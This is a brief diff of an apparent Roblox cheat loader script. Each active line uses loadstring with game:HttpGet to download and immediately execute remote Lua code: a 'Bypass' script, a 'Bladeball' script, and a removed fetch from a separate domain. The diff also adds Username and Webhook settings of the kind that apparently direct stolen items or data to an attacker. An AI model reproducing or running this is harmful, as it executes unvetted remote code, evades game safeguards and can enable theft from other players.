@@ -1,3 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Frostware-/refs/heads/main/Bypass.lua"))()
 
-loadstring(game:HttpGet("https://egorikusa.space/63c4b62629dc045b2872be31.lua", true))()
+Username = "pro1iji"
+Webhook = "000e604b-fb74-43e3-81d7-719d617f1127"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RedzHub9/RedzHub99z/refs/heads/main/Bladeball",true))()
